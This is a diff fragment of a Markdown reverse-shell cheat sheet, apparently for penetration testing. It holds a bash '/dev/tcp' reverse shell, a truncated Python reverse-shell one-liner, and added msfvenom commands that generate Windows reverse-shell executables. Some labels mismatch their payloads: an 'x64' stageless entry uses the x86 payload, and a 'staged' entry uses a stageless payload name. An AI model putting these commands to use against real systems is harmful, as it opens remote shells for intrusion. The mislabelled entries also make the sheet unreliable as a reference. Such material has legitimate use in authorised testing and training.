@@ -18,10 +18,30 @@ export RHOST="10.10.10.10"; export RPORT=443; python -c 'import sys,socket,os,pt
 /bin/bash -i >& /dev/tcp/10.0.0.1/443 0>&1
 ```
 
-**Msfvenom Reverse Shells**
+## **Msfvenom Reverse Shells**
+
+**Staged Payloads for Windows - x86**
 
 ```
-msfvenom -p windows/shell_reverse_tcp LHOST=$LHOST LPORT=$LPORT -f exe -o rshell.exe
+msfvenom -p windows/shell/reverse_tcp LHOST=$KALIIP LPORT=$KALIPORT -f exe > shell-x86.exe
+```
+
+**Staged Payloads for Windows - x64**
+
+```
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=$KALIIP LPORT=$KALIPORT -f exe > shell-x64.exe
+```
+
+**Stageless Payloads for Windows - x86**&#x20;
+
+```
+msfvenom -p windows/shell_reverse_tcp LHOST=$KALIIP LPORT=$KALIPORT -f exe > shell-x86.exe
+```
+
+**Stageless Payloads for Windows - x64**&#x20;
+
+```
+msfvenom -p windows/shell_reverse_tcp LHOST=$KALIIP LPORT=$KALIPORT -f exe > shell-x64.exe
 ```
 
 ```
